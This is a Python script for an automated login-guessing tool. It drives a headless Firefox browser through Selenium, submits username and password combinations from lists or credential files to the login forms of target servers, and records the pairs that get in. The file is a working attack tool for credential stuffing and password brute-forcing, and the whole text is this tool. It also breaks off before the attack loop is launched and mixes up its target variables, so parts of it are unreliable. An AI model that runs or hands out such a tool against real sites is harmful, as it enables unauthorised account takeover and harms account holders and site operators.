#! /usr/bin/env python3

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.options import Options
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime, time, sleep

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def login(browser, target, username, password, delay=1):
    t1 = time()
    browser.get(f"http://{target}")
    while True:
        try:
            form = browser.find_element(By.TAG_NAME, "form")
            break
        except NoSuchElementException:
            sleep(delay)
        except Exception as error:
            t2 = time()
            return error, t2-t1
    url = browser.current_url
    input_tags = form.find_elements(By.TAG_NAME, "input")
    username_tag = input_tags[0]
    password_tag = input_tags[1]
    username_tag.send_keys(username)
    password_tag.send_keys(password)
    submit_buttons = form.find_elements(By.TAG_NAME, "button")
    for submit_button in submit_buttons:
        if "login" in submit_button.text.lower():
            submit_button.click()
    if browser.current_url == url:
        t2 = time()
        return False, t2-t1
    t2 = time()
    return True, t2-t1
def loginHandler(thread_index, targets, credentials, delay, headless=True):
    successful_logins = {}
    options = Options()
    options.headless = True if headless else False
    browser = webdriver.Firefox(options=options)
    for username, password in credentials:
        for target in targets:
            status, time_taken = login(browser, target, username, password, delay)
            if status == True:
                successful_logins[target] = [username, password]
                display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
            elif status == False:
                display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
            else:
                display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status}{Fore.RESET}{Back.RESET}")
    browser.close()
    return successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-t', "--target", "target", "Target Servers (Seperated by ',' or File Name)"),
                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
    if not arguments.target:
        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.target, 'r') as file:
                arguments.targets = [target.strip() for target in file.read().split('\n') if target != '']
        except FileNotFoundError:
            arguments.target = arguments.target.split(',')
        except Exception as error:
            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
    if not arguments.credentials:
        if not arguments.users:
            display('-', f"Please specify {Back.YELLOW}Target Users{Back.RESET}")
            exit(0)
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
            exit(0)
        else:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    display('+', f"Total Target Servers = {Back.MAGENTA}{len(arguments.target)}{Back.RESET}")
    display('+', f"Total Credentials    = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")